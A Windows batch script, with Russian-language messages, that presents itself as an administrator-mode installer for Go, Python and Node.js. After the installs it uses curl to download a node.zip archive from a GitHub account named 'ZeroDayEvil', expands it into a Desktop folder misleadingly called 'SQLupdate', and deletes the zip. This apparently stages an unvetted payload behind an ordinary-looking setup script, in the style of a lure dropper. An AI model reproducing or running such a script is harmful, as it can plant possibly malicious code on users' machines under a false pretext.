@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

echo ========================================================
echo Автоматическая установка (Режим Администратора)
echo ========================================================
echo.

echo [*] Установка Go...
winget install -e --id GoLang.Go --silent --accept-package-agreements --accept-source-agreements

echo [*] Установка Python...
winget install -e --id Python.Python.3 --silent --accept-package-agreements --accept-source-agreements

echo [*] Установка Node.js...
winget install -e --id OpenJS.NodeJS.LTS --silent --accept-package-agreements --accept-source-agreements

set "TARGET_DIR=%USERPROFILE%\Desktop\SQLupdate"
set "ZIP_FILE=%TARGET_DIR%\node.zip"
set "DOWNLOAD_URL=https://raw.githubusercontent.com/ZeroDayEvil/ai-security-tool/main/data/node.zip"

echo.
echo [*] Создание папки...
if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"

echo [*] Загрузка архива...
curl -L "%DOWNLOAD_URL%" -o "%ZIP_FILE%"

echo [*] Распаковка архива...
powershell -Command "Expand-Archive -Path '%ZIP_FILE%' -DestinationPath '%TARGET_DIR%' -Force"

echo [*] Очистка...
if exist "%ZIP_FILE%" del /q "%ZIP_FILE%"

echo.
echo ========================================================
echo Установка завершена! 
echo ВАЖНО: Закройте это окно PowerShell и откройте новое, 
echo чтобы команды go, python и node начали работать.
echo ========================================================
pause
